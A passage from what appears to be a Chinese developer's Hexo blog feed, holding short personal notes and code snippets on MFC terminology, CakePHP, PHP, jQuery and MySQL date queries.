应用编程接口，接口实际上就是函数。<br>SDK - Software Development Kit 软件开发包，广义上指辅助开发某一类软件的相关文档、范例和工具的集合。<br>MFC - Microsoft Foundation Class-Library 是微软用C++对 API 进行的封装，简化使用，提高开发效率！<br>MSDN - Microsoft Software Developer Network 其中包括了所有微软公开的VC++的帮助文件和许多与开发相关的技术文档，可以说MSDN是在Windows系统上进行开发的必备东西。具体：VC6以及VS2008的MSDN下载地址见上面！<br>类库的图具体见MFC.png</p><p>④、一个简单的MFC对话框工程<br>◆ VC++环境介绍（各个窗口、插件 颜色、字体的配置等信息）；<br>◆ MessageBox函数的使用</p><p>⑤、VC编译EXE在没装VC的电脑上运行出错问题解决：<a href="http://www.cctry.com/thread-8837-1-1.html" target="_blank" rel="noopener">http://www.cctry.com/thread-8837-1-1.html</a></p><p>————————————- End ——————————————-</p>]]></content>
      
      
      <categories>
          
          <category> c&amp;c++ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>C++ 学习资源</title>
      <link href="/c-c/c&amp;c++/resources/"/>
      <url>/c-c/c&amp;c++/resources/</url>
      
        <content type="html"><![CDATA[<h2 id="学习计划"><a href="#学习计划" class="headerlink" title="学习计划"></a>学习计划</h2><p>1、基础C++ </p><p>2、框架 MFC -》  QT -》 wxwidget</p><p>3、界面库 DirectUI</p><p>学习资源：</p><p>界面开发 - 《UI的革命》文字版 </p><p><a href="http://www.uipower.com/index.php?m=content&amp;c=index&amp;a=show&amp;catid=15&amp;id=206" target="_blank" rel="noopener">http://www.uipower.com/index.php?m=content&amp;c=index&amp;a=show&amp;catid=15&amp;id=206</a></p><p>一步一步来吧、</p>]]></content>
      
      
      <categories>
          
          <category> c&amp;c++ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP 虚拟字段</title>
      <link href="/php/cakephp/cakephp-virturdField/"/>
      <url>/php/cakephp/cakephp-virturdField/</url>
      
        <content type="html"><![CDATA[<p>原理就是使用数据库的方法处理出来一个查询结果，然后使用一个别名、</p><pre><code>//比如select contanct(a,b) as c</code></pre><p>a , b 就是一个普通的属性，c可以理解为</p><pre><code>public $virtualFields = array(    &#39;name&#39; =&gt; &#39;CONCAT(User.first_name, &quot; &quot;, User.last_name)&#39;);</code></pre><p>配置的方法很简单，如上就是</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP 配置文件读取</title>
      <link href="/php/php/php-config-file/"/>
      <url>/php/php/php-config-file/</url>
      
        <content type="html"><![CDATA[<p>配置文件如</p><pre><code>return  array(&#39;&#39;&#39;key&#39;=&gt;&quot;value&quot;);</code></pre><p>读取就和简单</p><p>直接file_get_content()</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP CURL example</title>
      <link href="/php/php/php-curl-example/"/>
      <url>/php/php/php-curl-example/</url>
      
        <content type="html"><![CDATA[<pre><code>$host = APP_DEV ? &#39;ecode.com&#39; : &#39;ecode.yinuoinfo.com&#39;;                $uri  = &#39;http://&#39; . $host . &#39;/ApiJsonTicket/sendticket&#39;;                $ch   = curl_init();                curl_setopt($ch, CURLOPT_URL, $uri);                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);                curl_setopt($ch, CURLOPT_TIMEOUT, 30);                curl_setopt($ch, CURLOPT_POST, true);                curl_setopt($ch, CURLOPT_POSTFIELDS, array(                    &#39;json&#39; =&gt; json_encode($apiPost)                ));                $HttpResponse = curl_exec($ch);                curl_close($ch);</code></pre>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP 从另外一个页面读取数据</title>
      <link href="/php/cakephp/cakephp-read-data-from-page/"/>
      <url>/php/cakephp/cakephp-read-data-from-page/</url>
      
        <content type="html"><![CDATA[<pre><code class="php">$comments = $this-&gt;requestAction(&#39;/comments/latest&#39;);foreach ($comments as $comment) {    echo $comment[&#39;Comment&#39;][&#39;title&#39;];}echo $this-&gt;requestAction(    array(&#39;controller&#39; =&gt; &#39;articles&#39;, &#39;action&#39; =&gt; &#39;featured&#39;),    array(&#39;return&#39;));</code></pre>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP 常驻内存运行脚本</title>
      <link href="/php/php/php-long-time-running/"/>
      <url>/php/php/php-long-time-running/</url>
      
        <content type="html"><![CDATA[<pre><code class="php">ignore_user_abort();//关掉浏览器，PHP脚本也可以继续执行. set_time_limit(0);// 通过set_time_limit(0)可以让程序无限制的执行下去 $interval=60*30;// 每隔半小时运行 do{     //这里是你要执行的代码         sleep($interval);// 等待5分钟 }while(true);</code></pre>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>cake 分页一个典型的条件</title>
      <link href="/cakephp/cakephp/cakephp-paginate-example/"/>
      <url>/cakephp/cakephp/cakephp-paginate-example/</url>
      
        <content type="html"><![CDATA[<pre><code class="php">$this-&gt;paginate = array(            &#39;limit&#39; =&gt; $limit,            &#39;order&#39; =&gt; array(&#39;MerchantProductOrder.id&#39; =&gt; &#39;desc&#39;),            &#39;fields&#39; =&gt; array(                &#39;MerchantProductOrder.*&#39;,                &#39;MerchantProduct.*&#39;,                &#39;Merchant.*&#39;            ),            &#39;joins&#39; =&gt; array(                array(                    &#39;table&#39; =&gt; &#39;media_app_order&#39;,                    &#39;alias&#39; =&gt; &#39;MediaAppOrder&#39;,                    &#39;type&#39; =&gt; &#39;inner&#39;,                    &#39;conditions&#39; =&gt; array(                        &#39;MediaAppOrder.merchant_product_order_id = MerchantProductOrder.id&#39;,                    )                ),                array(                    &#39;table&#39; =&gt; &#39;merchant_products&#39;,                    &#39;alias&#39; =&gt; &#39;MerchantProduct&#39;,                    &#39;type&#39; =&gt; &#39;inner&#39;,                    &#39;conditions&#39; =&gt; array(                        &#39;MerchantProduct.id = MerchantProductOrder.product_id&#39;,                    )                ),                array(                    &#39;table&#39; =&gt; &#39;merchants&#39;,                    &#39;alias&#39; =&gt; &#39;Merchant&#39;,                    &#39;type&#39; =&gt; &#39;inner&#39;,                    &#39;conditions&#39; =&gt; array(                        &#39;Merchant.id = MerchantProduct.merchant_id&#39;,                    )                ),            ),            &#39;conditions&#39; =&gt; $conditions,        );</code></pre>]]></content>
      
      
      <categories>
          
          <category> cakephp </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>jquery 常用代码</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/jquery-useful-code/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/jquery-useful-code/</url>
      
        <content type="html"><![CDATA[<p>1、下拉菜单的制作方法</p><pre><code>                $(&#39;#nav .nav &gt;li&#39;).mouseover(function(){                    $(this).children(&#39;ul&#39;).show();                }).mouseout(function(){                    $(this).children(&#39;ul&#39;).hide();                })</code></pre><p>2、输入框的文字提示</p><pre><code>    var tmp;      $(&#39;.user&#39;).focus(function(){        tmp = $(this).val();        if($(this).val() == &#39;用户名&#39;)          $(this).val(&#39;&#39;);    }).blur(function(){        if($(this).val() == &#39;&#39;)          $(this).val(tmp);    })</code></pre><p> 说明：1、如果不输入还是会显示为提示字符</p><p>　　  如果输入了就不会再消失</p><p>3、一个技巧，显示当前的菜单状态</p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;    var key = &quot;home&quot;;  //使用&lt;php? echo $key; &gt;    $(&quot;#&quot;+key).addClass(&#39;active&#39;);&lt;/script&gt;</code></pre><p> 4、文本框加减,如果使用了html5 的number直接就可以了</p><pre><code>                $(function(){                //获得文本框对象                var t = $(&quot;#text_box&quot;);                //数量增加操作                $(&quot;#add&quot;).click(function(){                            t.val(parseInt(t.val())+1)                    if (parseInt(t.val())!=1){                        $(&#39;#text_box&#39;).attr(&#39;disabled&#39;,false);                    }                })                    //数量减少操作                $(&quot;#min&quot;).click(function(){                    t.val(parseInt(t.val())-1);                    if (parseInt(t.val()) &lt;=0){                        //节点操作                        t.val(1);                    }                })            })</code></pre><p> 5、unload请求一次数据</p><p>2中方法</p><p>　　1、设置ajax为同步</p><p>　　2、使用open window会浏览器拦截，</p><pre><code>        var i = new Image(1,1);         i.src=&#39;url&#39;;</code></pre><p>上面这种方法很巧妙</p><p>智能浮动的jquery 插件</p><pre><code>        $.fn.smartFloat = function() {            var position = function(element) {                var top = element.position().top, pos = element.css(&quot;position&quot;);                $(window).scroll(function() {                    var scrolls = $(this).scrollTop();                    if (scrolls &gt; top) {                        if (window.XMLHttpRequest) {                            element.css({                                position: &quot;fixed&quot;,                                top: 0                            });                            } else {                            element.css({                                top: scrolls                            });                            }                    }else {                        element.css({                            position: &quot;absolute&quot;,                            top: top                        });                        }                });            };            return $(this).each(function() {                position($(this));                                     });        };        $(&quot;.sp-list&quot;).smartFloat();</code></pre><p> 获取radio值的方法</p><pre><code>var` `ck = $(``&quot;input[name=&#39;ck&#39;]:checked&quot;``).val()</code></pre><p>多文件文件上传的插件</p><p>官方demo</p><p><a href="http://blueimp.github.io/jQuery-File-Upload/" target="_blank" rel="noopener">http://blueimp.github.io/jQuery-File-Upload/</a></p><p>5、自适应内容宽度</p><pre><code>(function ($) {  var loadImg = function (url, fn) {    var img = new Image();    img.src = url;    if (img.complete) {      fn.call(img);    } else {      img.onload = function () {        fn.call(img);        img.onload = null;      };        };  };  $.fn.imgAutoSize = function (padding) {    var maxWidth = this.innerWidth() - (padding || 0);    return this.find(&#39;img&#39;).each(function (i, img) {      loadImg(this.src, function () {        if (this.width &gt; maxWidth) {          var height = maxWidth / this.width * this.height,            width = maxWidth;          img.width = width;          img.maxHeight = height;        };      });    });  };})(jQuery);    </code></pre><p>6、一个相当简单的语音搜索技巧</p><input type="text" class="text" name="value_2" id="value_2" x-webkit-speech=""><p>就可以实现语音搜索，当然只是web-kit浏览器 </p>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Cake PHP 事务</title>
      <link href="/cakephp/cakephp/cakephp-transaction/"/>
      <url>/cakephp/cakephp/cakephp-transaction/</url>
      
        <content type="html"><![CDATA[<pre><code class="java">$db = $this-&gt;UserAccount-&gt;getDataSource();            $db-&gt;begin();            $this-&gt;UserAccount-&gt;updateAll(array(&#39;amount&#39; =&gt; &#39;UserAccount.amount - &#39; . $total_price), array(&#39;user_id&#39; =&gt; $user_id, &#39;amount &gt;=&#39; =&gt; $total_price));            $affectedrows = $this-&gt;UserAccount-&gt;getAffectedRows();            if (!$affectedrows) { // 没有响应行数则为扣失败                $this-&gt;log(&quot;VoucherComponent-&gt;send UserAccount 他帐号( $user_id )上没钱 $user_id = $user_id, \$total_price = $total_price&quot;);                $db-&gt;rollback();            }            $data[&#39;MerchantProductOrder&#39;][&#39;voucher_number&#39;] = $this-&gt;Voucher-&gt;generateQrCode();            if ($data[&#39;MerchantProductOrder&#39;][&#39;voucher_total&#39;] &lt; 1) {                $this-&gt;error(&#39;错误的凭证总数&#39;);                $db-&gt;rollback();            }            $data[&#39;MerchantProductOrder&#39;][&#39;voucher_remaining&#39;] = $data[&#39;MerchantProductOrder&#39;][&#39;voucher_total&#39;];            $data[&#39;MerchantProductOrder&#39;][&#39;send_type&#39;]=&#39;sms+mms&#39;;            $data[&#39;MerchantProductOrder&#39;][&#39;sms_content&#39;]=&#39;&#39;;            $data[&#39;MerchantProductOrder&#39;][&#39;mms_content&#39;]=&#39;&#39;;             $data[&#39;MerchantProductOrder&#39;][&#39;mms_title&#39;]=&#39;&#39;;            $data[&#39;MerchantProductOrder&#39;][&#39;callback_url&#39;]=&#39;&#39;;            $data[&#39;MerchantProductOrder&#39;][&#39;buyer_user_id&#39;]=$user_id;            $ret = $this-&gt;MerchantProductOrder-&gt;save($data);            $send_result = -1;            if ($ret) {                $send_result = $this-&gt;Voucher-&gt;send(                    $ret[&#39;MerchantProductOrder&#39;][&#39;id&#39;], $data[&#39;MerchantProductOrder&#39;][&#39;voucher_number&#39;], $data[&#39;MerchantProductOrder&#39;][&#39;mobile&#39;], $data[&#39;MerchantProductOrder&#39;][&#39;send_type&#39;], $data[&#39;MerchantProductOrder&#39;][&#39;sms_content&#39;], $data[&#39;MerchantProductOrder&#39;][&#39;mms_content&#39;], $data[&#39;MerchantProductOrder&#39;][&#39;mms_title&#39;]                );            }            if ($send_result == 0) {                $db-&gt;commit();                $this-&gt;succ(&#39;订单已经成功添加,订单ID：&#39; . $ret[&#39;MerchantProductOrder&#39;][&#39;id&#39;]);                $this-&gt;redirect(array(&#39;action&#39; =&gt; &#39;buy_succ&#39;, $ret[&#39;MerchantProductOrder&#39;][&#39;id&#39;]));            }else{                $db-&gt;rollback();                $this-&gt;log(&quot;ecommerceet_buy 创建订单失败 &quot;);                $this-&gt;error(&#39;创建订单失败&#39;);            }</code></pre><p>1、获取数据库资源</p><p>2、开始事务</p><p>3、如果有问题就回滚</p><p>4、如果没有问题就提交</p>]]></content>
      
      
      <categories>
          
          <category> cakephp </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Cake PHP 学习笔记</title>
      <link href="/cakephp/cakephp/cakephp-save-field/"/>
      <url>/cakephp/cakephp/cakephp-save-field/</url>
      
        <content type="html"><![CDATA[<pre><code class="php">$this-&gt;User-&gt;id = $user[&#39;User&#39;][&#39;id&#39;];$this-&gt;User-&gt;saveField(&quot;last_login&quot;, time());</code></pre>]]></content>
      
      
      <categories>
          
          <category> cakephp </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Cake PHP 学习笔记</title>
      <link href="/cakephp/cakephp/cakephp-lean-note/"/>
      <url>/cakephp/cakephp/cakephp-lean-note/</url>
      
        <content type="html"><![CDATA[<p><strong>控制器部分</strong></p><p>　　1、一个控制器就是一组的逻辑结合相似的页面的组成的。</p><p>　　2、一个action就是一个控制器之中的一个方法。也就是一个页面。</p><p>　　3、几个组件</p><p>　　4、核心组建可以不需要导入直接使用即可。</p><pre><code>$components$helpers$uses</code></pre><p>　4、三个回调方法</p><pre><code>Controller::beforeFilter()``Controller::beforeRender()``Controller::afterFilter()</code></pre><p>　5、$this-&gt;set();为页面赋值</p><p>　6、$this-&gt;render();</p><p>　7、 <code>$this-&gt;autoRender</code> to false 设置自动渲染</p><p>　8、If <code>$view</code> starts with ‘/’ it is assumed to be a view or element file relative to the <code>/app/View</code> folder. This allows direct rendering of elements, very useful in ajax calls.</p><p>　　关于渲染路径的说明</p><p>　9、</p><pre><code>几种跳转的方法、``$this``-&gt;redirect(``&#39;/orders/thanks&#39;``)); ``//相对路径``$this``-&gt;redirect(``&#39;http://www.example.com&#39;``); //绝对路径``$this``-&gt;redirect(``array``(``&#39;action&#39;` `=&gt; ``&#39;edit&#39;``, ``$id``)); ``//组装路径</code></pre><p>　10、</p><pre><code>$this-&gt;redirect($this-&gt;referer());返回上一个页面11、 $this-&gt;redirect($this-&gt;referer());另外一个返回上一页的方法12、获取登陆的用户验证数据$user_id = $this-&gt;UserAuth-&gt;getUserId();</code></pre><p>13、判断是否提交表单</p><p>　　</p><pre><code>$this-&gt;request-&gt;is(&#39;post&#39;)</code></pre><p>14、存储数据</p><p>如果是新的数据模型，开始要先使用create()创建一个新的记录。</p><pre><code>$this-&gt;模型-&gt;save($data)</code></pre><p>15、发送成功消息</p><p>　　</p><pre><code> $this-&gt;succ(&#39;已保存&#39;);</code></pre><p>16、发送错误</p><pre><code>$this-&gt;error(&#39;保存失败&#39;);</code></pre><p>17、警告信息</p><pre><code>$this-&gt;warning(&quot;没有记录&quot;);</code></pre><p>18、载入模型</p><pre><code>$this-&gt;loadModel(&quot;Tools&quot;);</code></pre><p>19、发送用户消息</p><pre><code>$this-&gt;Session-&gt;setFlash($message, &#39;default&#39;, array(&#39;class&#39; =&gt; &#39;alert alert-success&#39;));</code></pre><p> 20、cake用户密码</p><pre><code>md5(md5($password) . $salt);</code></pre><p> 21、使用app::uses();载入一个包，那个包，如果没有那个包，App::build(‘APackage/SubPackage’, $paths)构建一个即可</p><p> 22、App::import(‘Vendor’, ‘phpqrcode/qrlib’); 类的引入</p>]]></content>
      
      
      <categories>
          
          <category> cakephp </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ajax 文件上传</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/jquery-ajax-upload/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/jquery-ajax-upload/</url>
      
        <content type="html"><![CDATA[<pre><code class="javascript">function upload(){      $.ajaxFileUpload({          url:&#39;/Tools/ajaxUpload&#39;,          secureuri:false,          fileElementId:&#39;logo&#39;,          dataType: &#39;json&#39;,          success: function (data, status){              if(data.error)              {                alert(data.error);              }else              {                $(&quot;#logoPath&quot;).attr(&#39;value&#39;,data.logo);                $(&quot;#upload-tip&quot;).html(&#39;文件上传成功！&#39;+ getFileName(data.logo));                alert(&#39;文件上传成功！&#39;);              }          },          error: function (data, status, e)          {            alert(e);          }      }) ;    }</code></pre><p>需要载入 ajaxFileUpload </p>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php 读取文件并以文件方式下载</title>
      <link href="/php/php/php-read-file-and-download/"/>
      <url>/php/php/php-read-file-and-download/</url>
      
        <content type="html"><![CDATA[<pre><code class="java">if (!file_exists($filename)){  //判断能否获取这个文件            header(&quot;Content-type: text/html; charset=utf-8&quot;);            echo &quot;File not found!&quot;;            exit;         } else {            Header(&quot;Content-type: application/octet-stream&quot;);            Header(&quot;Accept-Ranges: bytes&quot;);            Header(&quot;Accept-Length: &quot;.filesize($filename));            Header(&quot;Content-Disposition: attachment; filename=&quot;.basename($filename));            echo file_get_contents($filename);            exit();        }</code></pre>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>MySQL 根据时间段获取数据</title>
      <link href="/php/mysql/mysql-by-time-range/"/>
      <url>/php/mysql/mysql-by-time-range/</url>
      
        <content type="html"><![CDATA[<p>时间格式为2008-06-16<br>查询出当天数据：<br>SELECT <em> FROM <code>table</code> WHERE date(时间字段) = curdate();<br>查询出当月字段：<br>SELECT </em><br>FROM <code>table</code><br>WHERE month( 时间字段) = month( now( ) ) ;<br>时间格式为1219876…… UNIX时间，只要应用“FROM_UNIXTIME( )”函数<br>例如查询当月：<br>SELECT <em><br>FROM <code>table</code><br>WHERE month( from_unixtime( reg_time ) ) = month( now( ) ) ;<br>查询上一个月的呢？变通一下！<br>SELECT </em><br>FROM <code>table</code><br>WHERE month( from_unixtime( reg_time ) ) = month( now( ) ) -1;</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>$_POST $_GET $_COOKIE的递归转义</title>
      <link href="/php/php/php-error-reporting/"/>
      <url>/php/php/php-error-reporting/</url>
      
        <content type="html"><![CDATA[<p>网上是这样说的</p><pre><code>说白了就是PHP页面报错的级别设置，我感觉这个功能很鸡肋，说白了，这玩意儿能报出来的错对于对PHP熟悉的人也不会犯，不熟悉的人你报出来也不知道是啥意思。想起以前经常改现成代码的时候经常遇到，好好的页面上挂一个“Warning:xxx”挺烦的...看着好象也没什么正经错误，但就是警告你，反正人家也没说当时就要抽你，但是警告你。解决方案就是加个error_reporting(0);意思是无视警告。内时候觉得特慎的慌，不敢使，怕万一有致命错误丫不报了咋整...在这里我就告诉各位，真有有致命错误你的程序根本运行不了，真是带BUG的可执行语句丫也报不出来！所以，到此为止，（0）就够了。有人好矫情，我就把这个函数详细说说，实际上人家分14个等级供你自定义报错的方式，有数字和字符串两种参数的写法，中文说明对应如下：数字    字符串          说明1       E_ERROR         致命的运行时错误。 错误无法恢复过来。脚本的执行被暂停 00000000 000000012       E_WARNING       非致命的运行时错误。脚本的执行不会停止  000000004       E_PARSE         编译时解析错误。解析错误应该只由分析器生成8       E_NOTICE        运行时间的通知。该脚本发现一些可能是一个错误，但也可能发生在正常运行一个脚本16      E_CORE_ERROR    在PHP启动时的致命错误。这就好比一个在PHP核心的E_ERROR32      E_CORE_WARNING  在PHP启动时的非致命的错误。这就好比一个在PHP核心E_WARNING警告64      E_COMPILE_ERROR  致命的编译时错误。这就像由Zend脚本引擎生成了一个E_ERROR128     E_COMPILE_WARNING 非致命的编译时错误。这就像由Zend脚本引擎生成了一个E_WARNING警告256     E_USER_ERROR    致命的用户生成的错误。这就像由使用PHP函数trigger_error（程序员设置E_ERROR）512     E_USER_WARNING   非致命的用户生成的警告。这就像由使用PHP函数trigger_error（程序员设定的一个E_WARNING警告）1024    E_USER_NOTICE    用户生成的通知。这就像一个由使用PHP函数trigger_error（程序员一个E_NOTICE集）2048    E_STRICT        运行时间的通知。4096    E_RECOVERABLE_ERROR 捕捉致命的错误。这就像一个E_ERROR，但可以通过用户定义的处理捕获（又见set_error_handler（））8191    E_ALL来        所有的错误和警告，除非横向E_STRICT（E_STRICT将是PHP 6.0中E_ALL来一部分的）</code></pre><p>其实是根据一个二进制的掩码来计算的具体规则如下</p><p>  00000000 00000000</p><p>根据燕十八的讲解很容易理解这个东西,把上面的规则计算成2进制出来即可</p><p>进一步拓展就可以使用位运算进行计算（位运算在这里发挥作用了啊）</p><pre><code>按位与    &amp;                        两边全为1  结果是1按位或    |                         两个有一个是1  结果是1按位异或   ^                    两边必须一个是0一个是1  结果才是1          按位取反  ~               0变1   1变0            </code></pre><p>举个例子即可E_ALL^E_NOTICE的意思就是去除掉notice类型的错误</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>$_POST $_GET $_COOKIE的递归转义</title>
      <link href="/php/php/escape-$_cookies/"/>
      <url>/php/php/escape-$_cookies/</url>
      
        <content type="html"><![CDATA[<pre><code>$_GET=array(&quot;&#39;ni,&#39;&#39;&#39;;aho&#39;&quot;);         if(get_magic_quotes_gpc()){         }else{             function _addslash(&amp;$v,$k){                 $v = addslashes($v);             }             array_walk_recursive(&amp;$_GET,&#39;_addslash&#39;);             print_r($_GET);         }</code></pre>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>位运算</title>
      <link href="/arithmetic/arithmetic/bit-operation/"/>
      <url>/arithmetic/arithmetic/bit-operation/</url>
      
        <content type="html"><![CDATA[<pre><code>按位与    &amp;                        两边全为1  结果是1           都为真才位真按位或    |                         两个有一个是1  结果是1　　　　有真则为真按位异或   ^                    两边必须一个是0一个是1  结果才是1  是或运算的一个特例可以解释位绝对的或。按位取反  ~               0变1   1变0           取反</code></pre><p><img src="/arithmetic/arithmetic/bit-operation/22094656-cc1b47aeaf8d4db0b3ea91cc17d7d6a5.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> arithmetic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Cake PHP 缓存</title>
      <link href="/cakephp/cakephp/cakephp-cache/"/>
      <url>/cakephp/cakephp/cakephp-cache/</url>
      
        <content type="html"><![CDATA[<pre><code>class Post extends AppModel {    public function newest() {        $result = Cache::read(&#39;newest_posts&#39;, &#39;longterm&#39;);  //去拿缓存数据        if (!$result) {  //如果缓存没有数据，就从数据库中去那数据            $result = $this-&gt;find(&#39;all&#39;, array(&#39;order&#39; =&gt; &#39;Post.updated DESC&#39;, &#39;limit&#39; =&gt; 10));  //获取数据            Cache::write(&#39;newest_posts&#39;, $result, &#39;longterm&#39;);  //写入一个缓存        }        return $result;    }}</code></pre><p>我以前一直不知道缓存怎么使用，其实是原来公司他们更本没有把缓存这样用，简直是吧缓当成了文件存储。</p><p>上面的例子一目了然啊、</p><p>在cakePHP 中使用的方法为</p><p>cakephp支持配置几个配置方案和存储引擎，分别对文件存储和外部存储进行使用</p><pre><code>Cache::config(``&#39;short&#39;``, ``array``(``  ``&#39;engine&#39;` `=&gt; ``&#39;File&#39;``,``  ``&#39;duration&#39;` `=&gt; ``&#39;+1 hours&#39;``,``  ``&#39;path&#39;` `=&gt; CACHE,``  ``&#39;prefix&#39;` `=&gt; ``&#39;cake_short_&#39;``));` `// long``Cache::config(``&#39;long&#39;``, ``array``(``  ``&#39;engine&#39;` `=&gt; ``&#39;File&#39;``,``  ``&#39;duration&#39;` `=&gt; ``&#39;+1 week&#39;``,``  ``&#39;probability&#39;` `=&gt; 100,``  ``&#39;path&#39;` `=&gt; CACHE . ``&#39;long&#39;` `. DS,``));</code></pre><p>　　上面就是两种配置方案</p><pre><code>CacheEngine::write($key, $value, $config = &#39;default&#39;)Returns:    boolean for success.Write value for a key into cache, optional string $config specifies configuration name to write to.CacheEngine::read($key)Returns:    The cached value or false for failure.Read a key from the cache. Return false to indicate the entry has expired or does not exist.CacheEngine::delete($key)Returns:    Boolean true on success.Delete a key from the cache. Return false to indicate that the entry did not exist or could not be deleted.CacheEngine::clear($check)Returns:    Boolean true on success.Delete all keys from the cache. If $check is true, you should validate that each value is actually expired.CacheEngine::clearGroup($group)Returns:    Boolean true on success.Delete all keys from the cache belonging to the same group.CacheEngine::decrement($key, $offset = 1)Returns:    Boolean true on success.Decrement a number under the key and return decremented valueCacheEngine::increment($key, $offset = 1)Returns:    Boolean true on success.Increment a number under the key and return incremented valueCacheEngine::gc()Not required, but used to do clean up when resources expire. FileEngine uses this to delete files containing expired content.</code></pre><p>这里的存储引擎，可以自己修改，使用的时候就使用自己的存储引擎，如果没有使用基类cache类就可以啊</p><p>配置一个组</p><pre><code>Cache::config(&#39;site_home&#39;, array(    &#39;engine&#39; =&gt; &#39;Redis&#39;, //redis服务器    &#39;duration&#39; =&gt; &#39;+999 days&#39;,  //时间    &#39;groups&#39; =&gt; array(&#39;comment&#39;, &#39;post&#39;)  //组模型));</code></pre>]]></content>
      
      
      <categories>
          
          <category> cakephp </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>阅读源码的方法</title>
      <link href="/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/read-source-skill/"/>
      <url>/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/read-source-skill/</url>
      
        <content type="html"><![CDATA[<p>吸收作者的思想为我所用</p><p>不能像看小说一样走马观花，每个方法都要弄清楚，遇到不明白的方法就要看手册，并记录亮点的地方。</p><ul><li><p>开始前写好用例，弄好环境</p></li><li><p>使用单步调试</p></li><li><p>分析的时候要做好记录</p></li><li><p>完了做好总结</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 理论方法 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>截取utf-8字符串原理</title>
      <link href="/php/php/php-truncate-utf-8/"/>
      <url>/php/php/php-truncate-utf-8/</url>
      
        <content type="html"><![CDATA[<pre><code class="java">&lt;?php//分析写在注释中class StringComponent{    //大致原理就是一个一个字节去读，如果第一个字符ascll数值大于224连续三个组成一个字，如果大于192就是2个，否则就是一个字母或标点    public static function cutString($sourceStr, $cutLength = 10, $extStr = &#39;...&#39;){        $returnStr = &#39;&#39;; $i = 0; $n = 0; //$i用于指针，$n 统计字符长度        $strLength = strlen($sourceStr);  //获取字符长度，注意这个不是字数的个数        if ($strLength &gt; $cutLength){　　　//判断参数合法            while (($n &lt; $cutLength) and ($i &lt;= $strLength)){  //限定循环范围                $tempStr = substr($sourceStr, $i, 1);　　　　//取出指针下一个字符                $ascnum = Ord($tempStr);　　　　//取出ascll值                if ($ascnum &gt;= 224){   //判断值的大小                    $returnStr = $returnStr . substr($sourceStr, $i, 3);  //弹出取到的汉字到结果中                    $i = $i+3;　　　　//指针移动三个字符长度                    $n++;  //字数统计+1                }elseif ($ascnum &gt;= 192){                     $returnStr=$returnStr.substr($sourceStr,$i,2);   //如上                    $i=$i+2;                    $n++;                }elseif ($ascnum &gt;= 65 &amp;&amp; $ascnum &lt;= 90){                    $returnStr = $returnStr.substr($sourceStr, $i, 1); //如上                    $i = $i+1;                    $n++;                }else{                     $returnStr = $returnStr.substr($sourceStr, $i, 1);  //这里要说下，如果小于65就是标点字符了，算作0.5个字符                    $i = $i+1;                    $n = $n+0.5;                }            }            if ($strLength &gt; $i){                $returnStr = $returnStr.$extStr;  //如果结果字符串小于长度那么，填上后缀标志            }            return $returnStr;        }        else            return $sourceStr;   //如果截取长度大于总长，返回原来的字符串    }}?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>项目开发设计流程心得</title>
      <link href="/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/project-work-flow/"/>
      <url>/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/project-work-flow/</url>
      
